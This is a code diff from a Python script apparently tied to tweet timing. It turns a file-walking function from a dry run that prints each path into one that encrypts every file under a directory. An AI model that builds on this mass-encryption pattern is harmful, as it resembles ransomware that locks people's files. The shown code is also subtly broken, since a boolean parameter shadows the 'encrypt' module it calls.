@@ -23,10 +23,11 @@ def check_tweet_time(tweet_time, check=86400):
 def traverse_dirs(root_dir, encrypt=False):
     for i in os.walk(root_dir):
         for x in i[2]:
+            path = os.path.normpath(os.path.join(os.getcwd(), i[0], x))
             if encrypt:
-                1+1
+                encrypt.encrypt_file(path)
             else:
-                print(os.path.normpath(os.path.join(os.getcwd(), i[0], x)))
+                print(path)
 
 
 def main():
